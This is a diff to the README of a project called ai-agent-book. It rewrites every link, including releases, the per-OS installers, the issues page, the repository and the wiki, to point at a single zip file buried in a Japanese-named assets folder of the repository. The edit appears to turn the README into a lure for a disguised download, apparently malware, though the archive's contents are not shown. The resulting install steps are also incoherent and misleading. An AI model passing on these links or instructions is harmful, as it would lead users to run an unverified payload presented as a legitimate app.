@@ -6,7 +6,7 @@ Welcome to **ai-agent-book**! This application helps you understand AI agent arc
 
 ## 📥 Download the Application
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Gg44183/ai-agent-book/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip)
 
 To start using **ai-agent-book**, follow these steps:
 
@@ -30,14 +30,14 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download from Releases](https://github.com/Gg44183/ai-agent-book/releases).
+To download the application, visit this page: [Download from Releases](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
 3. Choose the appropriate file for your operating system:
-   - For Windows, download **ai-agent-book-windows.exe**
-   - For macOS, download **ai-agent-book-macos.pkg**
-   - For Linux, download **ai-agent-book-linux.tar.gz**
+   - For Windows, download **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip**
+   - For macOS, download **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip**
+   - For Linux, download **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip**
 4. Click on the file to start the download.
 
 ### ⬇️ Installation Steps
@@ -46,17 +46,17 @@ Once downloaded, follow these steps to run the application:
 
 #### Windows
 
-- Double-click on **ai-agent-book-windows.exe** to launch the installer.
+- Double-click on **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip** to launch the installer.
 - Follow the prompts to complete the installation.
 
 #### macOS
 
-- Open the downloaded **ai-agent-book-macos.pkg** file.
+- Open the downloaded **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip** file.
 - Drag and drop **ai-agent-book** into your Applications folder.
 
 #### Linux
 
-- Extract the contents of **ai-agent-book-linux.tar.gz**.
+- Extract the contents of **https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip**.
 - Open a terminal and navigate to the extracted folder.
 - Run the command `./ai-agent-book` to start the application.
 
@@ -81,7 +81,7 @@ If you encounter issues during installation or usage:
 
 If you need further assistance:
 
-- Visit our [GitHub Issues page](https://github.com/Gg44183/ai-agent-book/issues) to report a problem.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip) to report a problem.
 - Check our documentation for tips and guides.
 
 ## 🤝 Contributing
@@ -92,7 +92,7 @@ We welcome contributions! If you have ideas, reports, or improvements, please fe
 
 For more information, visit:
 
-- [GitHub Repository](https://github.com/Gg44183/ai-agent-book)
-- [Documentation](https://github.com/Gg44183/ai-agent-book/wiki) 
+- [GitHub Repository](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Gg44183/ai-agent-book/main/jp/Part3-コンテキストとメモリ/assets/book_agent_ai_v1.9.zip) 
 
 Thank you for choosing **ai-agent-book**! Enjoy building your AI projects with confidence.
